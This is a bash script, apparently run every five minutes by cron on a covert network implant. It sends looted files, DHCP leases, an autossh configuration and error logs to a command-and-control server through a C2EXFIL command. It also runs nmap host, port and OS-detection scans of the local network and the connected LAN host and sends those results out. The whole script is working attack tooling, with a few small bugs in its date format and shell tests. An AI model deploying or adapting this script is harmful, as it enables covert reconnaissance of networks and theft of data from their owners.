#!/bin/bash
# Grabs anything in /root/loot and exfils to c2
# Archives in /root/looted
# */5 * * * * * bash /root/scripts/5minute.sh

## vars
loot="/root/loot"
looted="/root/looted"
timestamp=`date +"%Y-%y-%d_%H%M%S"`

file_array=(
  '/var/dhcp.leases'
  '/etc/config/autossh'
)

lanl_ip_mask=`ip addr | grep eth0 -A2 | grep 'state UP' -A2 | tail -n1 | awk '{print $2}'`
lan_up_ip=`ip addr | grep eth0 -A2 | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'`
lan_up_ip_mask=`ip addr | grep eth0 -A2 | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f2  -d'/'`
lan_default_gw=`ip route | grep default | grep 192.168.7.120 | awk '{print $3}'`

local_ip_mask=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}'`
local_up_ip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'`
local_up_ip_mask=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f2  -d'/'`
local_default_gw=`ip route | grep default | grep 192.168.7.120 | awk '{print $3}'`

## functions
exfil_keep() {
  if [ -z "$2" ]
  then
    source="misc"
  else
    source="$2"
  fi

  C2EXFIL STRING $1 ${HOSTNAME}-$source

}

exfil() {
  if [ "$2"=="" ]
  then
    lsource="misc"
  else
    lsource="$2"
  fi

  if C2EXFIL STRING $1 ${HOSTNAME}-$lsource
  then
    mv $1 ${looted}
  else
    echo "error exfiltrating $1"
  fi
}

## look at me go!
# look for loot
echo "## exfil loot"
lootlist=(/root/loot/*)

for counter in ${!lootlist[*]}; do
  if [ -f ${lootlist[counter]} ]
  then
    size=$(wc -c <"${lootlist[counter]}")
    if [ $size -gt 0 ]
    then
      if [ -f "${lootlist[counter]}" ]; then
        exfil "${lootlist[counter]}" "loot"
      else
        echo "No loot to exfil"
      fi
    else
      rm ${lootlist[counter]}
    fi
  fi

done

# loop thru the array of files that we keep!
echo "## exfil some logs"
for file in "${file_array[@]}"
do
    size=$(wc -c <"$file")
    if [ $size -gt 0 ]
    then
    if [ -f $file ]
      then
        exfil_keep $file
      fi
    fi
done

# look and exfil for cc-client-error logs
echo "## exfil cc-client error logs"
if [ -f "/var/cc-client-error.log" ]
  then
    if exfil /var/cc-client-error.log cc-client-log
    then
      rm /var/cc-client-error.log
    fi
fi

# run a quick nmap against the local network
echo "## nmap quick scan"
jobtimestamp=${timestamp}
if nmap -sn ${local_default_gw}/${local_up_ip_mask} > /root/${jobtimestamp}_quickscan.txt
  then
    exfil /root/${jobtimestamp}_quickscan.txt nmap-scan_local
fi

# run a quick nmap against the lan network, if up
if ( ip addr | grep eth0 | grep "state UP" > /dev/null )
then
  echo "## LAN is UP, SCANNING host on LAN"
  jobtimestamp=${timestamp}
  # IP of connected host
  lan_host=`awk '{print $3}' /tmp/dhcp.leases`
  if nmap -sS -sU ${lan_host} > /root/${jobtimestamp}_lanhostscan.txt
  then
    exfil /root/${jobtimestamp}_lanhostscan.txt nmap-scan_lanhost
  fi

else
  echo "## LAN is DOWN"

fi

# run a nmap against the local network, detecting OS
jobtimestampOS=${timestamp}
# check to see if existing nmap running
if ! pgrep nmap > /dev/null
then
  echo "## running nmap OS scan"

  nmap -sS -O -max-os-tries 1 ${local_default_gw}/${local_up_ip_mask} > /root/loot/${jobtimestampOS}_OSscan.txt &

else

  echo "## nmap OS scan running"

fi
